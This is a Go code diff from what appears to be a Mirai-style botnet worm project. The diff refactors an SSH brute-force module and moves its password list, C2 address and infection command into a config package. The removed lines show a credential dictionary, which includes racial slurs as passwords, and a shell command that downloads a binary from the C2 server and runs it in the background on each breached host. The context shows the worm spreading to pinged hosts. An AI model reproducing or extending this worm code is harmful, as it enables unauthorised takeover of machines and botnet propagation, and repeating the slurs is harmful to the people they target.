@@ -4,27 +4,12 @@ import (
 	"fmt"
 	"os"
 	"sync"
-	"time"
+	myconfig "terylene/config"
 	"terylene/mirai/components/skills"
 	"terylene/mirai/components/system"
+	"time"
 
 	"golang.org/x/crypto/ssh"
-)
-
-var (
-	C2ip = "0.0.0.0"
-	// config here
-	//brute force <user> : list of passwords
-	passwordMap = map[string][]string{
-		"root": {
-			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
-		},
-		"Admin": {
-			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
-		},
-	}
-
-	infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
 )
 
 func sshattack(ip string, login map[string][]string, wg *sync.WaitGroup) {
@@ -76,7 +61,7 @@ func sshconnect(ip, user, pass string, wg *sync.WaitGroup, cancel chan struct{})
 	session.Stdout = os.Stdout
 	session.Stderr = os.Stderr
 
-	if err := session.Run(fmt.Sprintf(infcommand, C2ip)); err != nil {
+	if err := session.Run(fmt.Sprintf(myconfig.Infcommand, myconfig.C2ip)); err != nil {
 		return
 	}
 
@@ -113,7 +98,7 @@ func Startworm() {
 				valid = append(valid, ip)
 			}
 		}
-		sshworm(valid, passwordMap)
+		sshworm(valid, myconfig.PasswordMap)
 	}
 	active := skills.Pinger(ip, OS)
 	for _, ip := range active {
@@ -121,7 +106,7 @@ func Startworm() {
 			valid = append(valid, ip)
 		}
 	}
-	sshworm(active, passwordMap)
+	sshworm(active, myconfig.PasswordMap)
 
 	onlineworm()
 }
